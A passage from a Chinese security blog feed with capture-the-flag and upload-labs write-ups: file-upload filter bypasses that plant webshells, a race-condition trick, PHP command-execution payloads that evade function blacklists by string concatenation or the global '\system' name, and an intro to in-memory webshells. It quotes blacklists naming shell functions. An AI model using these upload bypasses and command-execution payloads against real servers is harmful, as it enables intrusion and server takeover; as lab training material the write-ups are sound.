class="variable">$fileType</span> = <span class="string">&#x27;unknown&#x27;</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$fileType</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这是用来检测图片前俩个字节是否是jpg，png，gif的标识符的代码。</p>
<p>我们利用vscode中的hex editor将木马文件的前两个字节改为89 50</p>
<p><img src="/../images/1740213110637.jpg" alt="1740213110637" loading="lazy"></p>
<p>可以看到它已经被识别为png文件，这时候我们需要用到文件包含漏洞来使得这个文件能被解释为php文件。</p>
<p><img src="/../images/1740213287533.jpg" alt="1740213287533" loading="lazy"></p>
<p>这里是通过get方法获取文件来进行包含。由于include.php在我们上传的木马的上一级目录，我们需要这样<img src="/../images/1740213576970.jpg" alt="1740213576970" loading="lazy"></p>
<p>这时include.php文件便可以包含并以php解释我们的木马。</p>
<p>我们再用蚁剑测试可以连接成功。</p>
<h1 id="pass15-图片马"><a href="#pass15-图片马" class="headerlink" title="pass15(图片马)"></a>pass15(图片马)</h1><p>查看源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$types</span> = <span class="string">&#x27;.jpeg|.png|.gif&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="variable">$info</span> = <span class="title function_ invoke__">getimagesize</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">image_type_to_extension</span>(<span class="variable">$info</span>[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$types</span>,<span class="variable">$ext</span>)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$ext</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>getimagesize($filename)</code> 函数获取图像文件的相关信息，包括图像的宽度和高度，以及一个表示图像类型的常量（&#x3D;1，2，3…）。</li>
<li><code>image_type_to_extension()</code> 函数将 <code>getimagesize()</code> 返回的图像类型转换为对应的文件扩展名。</li>
</ul>
<p>我们修改它的文件头为47 49 46 38即gif，再用文件包含漏洞，便能成功连接。</p>
<p><img src="/../images/1740215865791.jpg" alt="1740215865791" loading="lazy"></p>
<p><img src="/../images/1740216017771.jpg" alt="1740216017771" loading="lazy"></p>
<h1 id="pass16"><a href="#pass16" class="headerlink" title="pass16"></a>pass16</h1><p>和15关差不多，不过检测函数变成了exif_imagetype（）它只会检测图片类型，不会检测高宽什么的。</p>
<h1 id="less17（二次渲染）"><a href="#less17（二次渲染）" class="headerlink" title="less17（二次渲染）"></a>less17（二次渲染）</h1><p>查看源码发现有新函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$target_path</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li><code>imagecreatefromjpeg()</code>：这是PHP中的一个内置函数，用于从JPEG文件创建一个新的图像资源。该函数读取指定的JPEG文件，并返回一个图像标识符，代表了一幅图像，可以用于进一步的图像处理。</li>
</ul>
<p>当然不止重新生成jpeg的，还有别的，问题就是重新生成后文件中的一些内容会被改写，我们的木马就可能被改写，因此我们要在不会被改写的地方写入我们的一句话木马再用文件包含漏洞进行上传shell。这里我们用最简单的gif二次渲染，别的图片可以查看这个博客<a href="https://blog.csdn.net/weixin_45588247/article/details/119177948">【文件上传绕过】——二次渲染漏洞_二次渲染绕过-CSDN博客</a></p>
<p><img src="/../images/1740233716974.jpg" alt="1740233716974" loading="lazy"></p>
<p>这是在未改写区修改后的图片，上传后发现还在</p>
<p><img src="/../images/1740233772282.jpg" alt="1740233772282" loading="lazy"></p>
<p>我们再利用文件上传漏洞</p>
<p><img src="/../images/1740233904730.jpg" alt="1740233904730" loading="lazy"></p>
<p>成功。</p>
<h1 id="less18（条件竞争）"><a href="#less18（条件竞争）" class="headerlink" title="less18（条件竞争）"></a>less18（条件竞争）</h1><p>查看源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$file_name</span>,<span class="title function_ invoke__">strrpos</span>(<span class="variable">$file_name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="variable">$upload_file</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$upload_file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">             <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span>. <span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line">             <span class="title function_ invoke__">rename</span>(<span class="variable">$upload_file</span>, <span class="variable">$img_path</span>);</span><br><span class="line">             <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$upload_file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>发现服务器先通过move_uploaded_file()将文件保存到指定路径再来判断后缀名是否相符。这时文件是会在服务器上先存在一定的时间的，我们这时在访问这个文件（这个文件会生成一个含有一句话木马的文件），只要在文件还存在的时候访问，这样木马便会生成在upload目录下。</p>
<p>我们需要用到bp来进行不断发送与访问文件。且只有一定的几率成功。</p>
<h1 id="less19-apache解析漏洞-条件竞争"><a href="#less19-apache解析漏洞-条件竞争" class="headerlink" title="less19(apache解析漏洞+条件竞争)"></a>less19(apache解析漏洞+条件竞争)</h1><h2 id="apache解析漏洞"><a href="#apache解析漏洞" class="headerlink" title="apache解析漏洞"></a>apache解析漏洞</h2><p>apc是从又往左读取文件名的，如果一个文件shell.php.*,其中的 *是apc不能解析的后缀，那么他就会往前读也就是以php的形式解析。</p>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>查看源码可知</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">move</span>();</span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// check if we need to rename the file</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="variable language_">$this</span>-&gt;cls_rename_file == <span class="number">1</span> )&#123;</span><br><span class="line">  <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">renameFile</span>();</span><br><span class="line">  <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );    </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>这关的文件移动是在文件检查之前，在文件重命名之后，那么我们可以利用条件竞争在文件被重命名之前访问shell.php.7z，这样就有机会在upload目录下生成木马，不过复现只是有概率成功，主要看服务器处理的速度与请求发送的速度。</p>
<h1 id="less20"><a href="#less20" class="headerlink" title="less20"></a>less20</h1><p>查看源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$file_name</span>,PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123; </span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;禁止保存为该类型文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现我们可以自定义文件名，且只有黑名单过滤，且没有条件竞争。我们可以利用user.ini，点加空格加点，加点，::$DATA,apc解析漏洞，不过这些都要注意php或者apache版本不能太高。 </p>
<h1 id="less21"><a href="#less21" class="headerlink" title="less21"></a>less21</h1><p>看源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//检查MIME</span></span><br><span class="line">    <span class="variable">$allow_type</span> = <span class="keyword">array</span>(<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/gif&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>],<span class="variable">$allow_type</span>))&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该类型文件!&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//检查文件名</span></span><br><span class="line">        <span class="variable">$file</span> = <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>]) ? <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] : <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$file</span>);</span><br><span class="line">        <span class="variable">$allow_suffix</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="variable">$allow_suffix</span>)) &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该后缀文件!&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$file_name</span> = <span class="title function_ invoke__">reset</span>(<span class="variable">$file</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file</span>[<span class="title function_ invoke__">count</span>(<span class="variable">$file</span>) - <span class="number">1</span>];</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传成功！&quot;</span>;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传失败！&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;请选择要上传的文件！&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先，判断文件的<code>Content-Type</code>类型是否在白名单中</p>
<p>如果<code>POST</code>接收的<code>save_name</code>为空，则赋值为<code>$_FILES[&#39;upload_file&#39;][&#39;name&#39;]</code>,不为空就为本身</p>
<p><code>if (!is_array($file))</code> - 这一行检查变量<code>$file</code>是否不是数组。如果<code>$file</code>不是数组，那么花括号内的代码将会被执行。</p>
<p><code>explode()</code> 函数把字符串根据**”.”**打散为数组.</p>
<p><code>end()</code>函数将 <code>array</code>的内部指针移动到最后一个单元并返回其值<br><code>reset()</code>函数将 <code>array</code> 的内部指针倒回到第一个单元并返回第一个数组单元的值<br><code>count()</code> 函数计算数组中的单元数目或对象中的属性个数</p>
<p>重点是<code> $file_name = reset($file) . &#39;.&#39; . $file[count($file) - 1];</code></p>
<p>是根据flie数组的第一个和数组元素-1个的元素命名的，那么我们可以让file[0]&#x3D;shell,file[2]&#x3D;php,file[3]&#x3D;jpg,这样3-1&#x3D;2，file[2]就是我们想要的php后缀。</p>
<p><img src="/../images/1740299731189.jpg" alt="1740299731189" loading="lazy"></p>
<p><img src="/../images/1740299772434.jpg" alt="1740299772434" loading="lazy"></p>
<p>上传成功。</p>
]]></content>
      <tags>
        <tag>upload-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>tgctf2025</title>
    <url>/2025/04/12/tgctf2025/</url>
    <content><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="AAA偷渡阴平"><a href="#AAA偷渡阴平" class="headerlink" title="AAA偷渡阴平"></a>AAA偷渡阴平</h2><p>?tgctf2025&#x3D;system(key(getallheaders()));</p>
<p>利用key(getallheaders())获取第一个文件头的值，再利用system执行，我们先目录遍历发现flag在..&#x2F;..&#x2F;..,然后修改指令为cat ..&#x2F;..&#x2F;..&#x2F;flag便能得到flag。</p>
<h2 id="火眼辩魑魅"><a href="#火眼辩魑魅" class="headerlink" title="火眼辩魑魅"></a>火眼辩魑魅</h2><p>首先访问robots.txt发现有</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-Agent: *</span><br><span class="line">Disallow: tgupload.php</span><br><span class="line">Disallow: tgshell.php</span><br><span class="line">Disallow: tgxff.php</span><br><span class="line">Disallow: tgser.php</span><br><span class="line">Disallow: tgphp.php</span><br><span class="line">Disallow: tginclude.php</span><br></pre></td></tr></table></figure>

<p>一个个看过去发现，tginclude.php可以用php伪协议php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;来读取其他页面的源码发现tgshell.php中是用<code>if(!preg_match(&quot;/openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|scandir|assert|pcntl_exec|fwrite|curl|system|eval|assert|flag|passthru|exec|chroot|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore/i&quot;, $shell))</code></p>
<p>进行过滤的，那么我们可以利用字符串拼接来绕过如</p>
<p><code>(&#39;sy&#39; . &#39;stem&#39;)(&#39;cat ../../../tgfffffllllaagggggg&#39;);</code></p>
<p>我们可以先目录遍历发现flag在前三层然后直接cat获取。</p>
<p>得到TGCTF{bd737064-fc78-5d40-df61-03e28c2a91e7}</p>
<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><p>解压压缩包发现有好多层，直接叫豆包写代码打开最后一层</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def read_deep_folder(folder_path, folder_name):</span><br><span class="line">    try:</span><br><span class="line">        # 构建下一层同名子文件夹的路径</span><br><span class="line">        sub_folder_path = os.path.join(folder_path, folder_name)</span><br><span class="line">        # 检查该路径是否为文件夹</span><br><span class="line">        if os.path.isdir(sub_folder_path):</span><br><span class="line">            # 若为文件夹，则递归调用函数继续查找</span><br><span class="line">            return read_deep_folder(sub_folder_path, folder_name)</span><br><span class="line">        # 若不是文件夹，返回当前路径</span><br><span class="line">        return folder_path</span><br><span class="line">    except FileNotFoundError:</span><br><span class="line">        print(f&quot;错误：未找到文件夹 &#123;folder_path&#125;。&quot;)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(f&quot;发生未知错误：&#123;e&#125;&quot;)</span><br><span class="line">    return None</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def read_files_in_folder(folder_path):</span><br><span class="line">    try:</span><br><span class="line">        if os.path.exists(folder_path):</span><br><span class="line">            for root, dirs, files in os.walk(folder_path):</span><br><span class="line">                for file in files:</span><br><span class="line">                    file_path = os.path.join(root, file)</span><br><span class="line">                    try:</span><br><span class="line">                        with open(file_path, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;) as f:</span><br><span class="line">                            content = f.read()</span><br><span class="line">                            print(f&quot;文件 &#123;file_path&#125; 的内容：&quot;)</span><br><span class="line">                            print(content)</span><br><span class="line">                    except Exception as e:</span><br><span class="line">                        print(f&quot;读取文件 &#123;file_path&#125; 时出错：&#123;e&#125;&quot;)</span><br><span class="line">        else:</span><br><span class="line">            print(f&quot;文件夹 &#123;folder_path&#125; 不存在。&quot;)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(f&quot;发生未知错误：&#123;e&#125;&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    # 请替换为起始文件夹路径</span><br><span class="line">    start_folder = &quot;your_start_folder_path&quot;</span><br><span class="line">    # 请替换为要查找的同名文件夹名称</span><br><span class="line">    target_folder_name = &quot;your_target_folder_name&quot;</span><br><span class="line">    result = read_deep_folder(start_folder, target_folder_name)</span><br><span class="line">    if result:</span><br><span class="line">        print(f&quot;最后一层的文件夹路径是: &#123;result&#125;&quot;)</span><br><span class="line">        read_files_in_folder(result)</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p>打开最后一层发现了</p>
<p>flag{so_great!}</p>
]]></content>
      <tags>
        <tag>tgctf</tag>
      </tags>
  </entry>
  <entry>
    <title>关于call_user_func函数</title>
    <url>/2025/05/22/%E5%85%B3%E4%BA%8Ecall-user-func-%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在打轩辕杯的时候遇到这个函数且被过滤了一堆常见函数。</p>
<h1 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func"></a><code>call_user_func</code></h1><p>把第一个参数作为回调函数调用</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="keyword">callable</span> <span class="variable">$callback</span>, <span class="keyword">mixed</span> ...<span class="variable">$args</span>)</span><br></pre></td></tr></table></figure>

<h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><ul>
<li><p><code>callback</code></p>
<p>将被调用的回调函数（callable，回调函数是指可以作为参数传递给其他函数或方法的函数，回调函数不止可以是简单函数，还可以是对象的方法，包括静态类方法。除了语言结构例如：array，echo，empty，eval，exit，isset，list，print 或 unset）</p>
</li>
<li><p><code>args</code></p>
<p>0个或以上的参数，被传入回调函数。</p>
</li>
</ul>
<h1 id="在实战中"><a href="#在实战中" class="headerlink" title="在实战中"></a>在实战中</h1><p>过滤了一堆函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$disable_fun</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&quot;exec&quot;</span>, <span class="string">&quot;shell_exec&quot;</span>, <span class="string">&quot;system&quot;</span>, <span class="string">&quot;passthru&quot;</span>, <span class="string">&quot;proc_open&quot;</span>, <span class="string">&quot;show_source&quot;</span>, </span><br><span class="line">        <span class="string">&quot;phpinfo&quot;</span>, <span class="string">&quot;popen&quot;</span>, <span class="string">&quot;dl&quot;</span>, <span class="string">&quot;proc_terminate&quot;</span>, <span class="string">&quot;touch&quot;</span>, <span class="string">&quot;escapeshellcmd&quot;</span>, </span><br><span class="line">        <span class="string">&quot;escapeshellarg&quot;</span>, <span class="string">&quot;assert&quot;</span>, <span class="string">&quot;substr_replace&quot;</span>, <span class="string">&quot;call_user_func_array&quot;</span>, </span><br><span class="line">        <span class="string">&quot;call_user_func&quot;</span>, <span class="string">&quot;array_filter&quot;</span>, <span class="string">&quot;array_walk&quot;</span>, <span class="string">&quot;array_map&quot;</span>, </span><br><span class="line">        <span class="string">&quot;register_shutdown_function&quot;</span>, <span class="string">&quot;register_tick_function&quot;</span>, <span class="string">&quot;filter_var&quot;</span>, </span><br><span class="line">        <span class="string">&quot;filter_var_array&quot;</span>, <span class="string">&quot;uasort&quot;</span>, <span class="string">&quot;uksort&quot;</span>, <span class="string">&quot;array_reduce&quot;</span>, <span class="string">&quot;array_walk&quot;</span>, </span><br><span class="line">        <span class="string">&quot;array_walk_recursive&quot;</span>, <span class="string">&quot;pcntl_exec&quot;</span>, <span class="string">&quot;fopen&quot;</span>, <span class="string">&quot;fwrite&quot;</span>, </span><br><span class="line">        <span class="string">&quot;file_put_contents&quot;</span>, <span class="string">&quot;readfile&quot;</span>, <span class="string">&quot;file_get_contents&quot;</span>, <span class="string">&quot;highlight_file&quot;</span>, <span class="string">&quot;eval&quot;</span></span><br><span class="line">    );</span><br></pre></td></tr></table></figure>

<h2 id="1-尝试readgzfile："><a href="#1-尝试readgzfile：" class="headerlink" title="1.尝试readgzfile："></a>1.尝试<strong>readgzfile</strong>：</h2><p><strong>核心功能</strong></p>
<p><strong>gz文件</strong>：直接读取 .gz 文件并解压内容，无需手动处理压缩数据，并输出。</p>
<p><strong>非压缩文件</strong>：如果文件不是 gzip 格式，会直接读取原内容，并输出。</p>
<p>那么我们就可以这样<code>call_user_func(&#39;readgzfile&#39;,&#39;/xxx&#39;)</code></p>
<h2 id="2-全局命名空间："><a href="#2-全局命名空间：" class="headerlink" title="2.全局命名空间："></a>2.全局命名空间：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">call_user_func(&#x27;\system&#x27;,&#x27;命令&#x27;)</span><br></pre></td></tr></table></figure>

<p>这样也是可以直接执行命令的。 </p>
<h3 id="system-的含义"><a href="#system-的含义" class="headerlink" title="\system 的含义"></a><code>\system</code> 的含义</h3><ul>
<li><strong><code>\</code> 符号</strong>：开头的反斜杠表示<strong>全局命名空间</strong>（Global Namespace）。</li>
<li>**<code>system</code>**：这是一个PHP内置函数，用于执行操作系统的Shell命令（如<code>system(&#39;ls&#39;)</code>）。</li>
</ul>
<p>因此，<code>\system</code> 明确指定调用<strong>全局作用域中的<code>system()</code>函数</strong>（即使当前代码在其他命名空间内，也会忽略当前命名空间，直接访问全局函数）。</p>
]]></content>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>内存马</title>
    <url>/2025/04/24/%E5%86%85%E5%AD%98%E9%A9%AC/</url>
    <content><![CDATA[<h1 id="什么是内存马"><a href="#什么是内存马" class="headerlink" title="什么是内存马"></a>什么是内存马</h1><p>Webshell内存马，是在内存中写入恶意后门和木马并执行，达到远程控制Web服务器的一类内存马，其瞄准了企业的对外窗口：网站、应用。但传统的Webshell都是基于文件类型的，黑客可以利用上传工具或网站漏洞植入木马，区别在于Webshell内存马是无文件马，利用中间件的进程执行某些恶意</p>
<p>代码，不会有文件落地，给检测带来巨大难度。</p>
<h2 id="python内存马"><a href="#python内存马" class="headerlink" title="python内存马"></a>python内存马</h2><p>利用flask框架中存在的ssti注入来实现内存修改的，具体是通过flask框架存在应用模板渲染过程的render_template_string()函数，在进行渲染但未对用户传输的代码进行过滤导致用户可以通过注入恶意代码来实现python内存马的注入。</p>
<h3 id="1-中间件注入"><a href="#1-中间件注入" class="headerlink" title="1.中间件注入"></a>1.中间件注入</h3><p>中间件是位于 Web 服务器与 Web 应用程序之间的一层软件，用于对请求和响应进行处理和转换。</p>
<p>典型工作流程如下：</p>
<ol>
<li><strong>请求进入</strong>：客户端请求 → 服务器接收 → 中间件1 → 中间件2 → … → 路由处理</li>
<li><strong>响应返回</strong>：路由处理结果 → … → 中间件2 → 中间件1 → 客户端响应</li>
</ol>
<p>中间件注入需要能够在目标应用中执行任意代码，这样才能插入恶意的中间件。所以，攻击的前提是存在一个允许执行任意代码的漏洞，比如远程代码执行（RCE）、反序列化漏洞，或者应用存在文件上传漏洞导致恶意代码执行等</p>
<h2 id="java"><a href="#java" class="headerlink" title="java"></a>java</h2><h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><h3 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h3><p>Servlet 是运行在 Web 服务器或应用服务器上的程序，它是作为来自 HTTP 客户端的请求和 HTTP 服务器上的数据库或应用程序之间的中间层。它负责处理用户的请求，并根据请求生成相应的返回信息提供给用户。客户端发起一个http请求，比如get类型。</p>
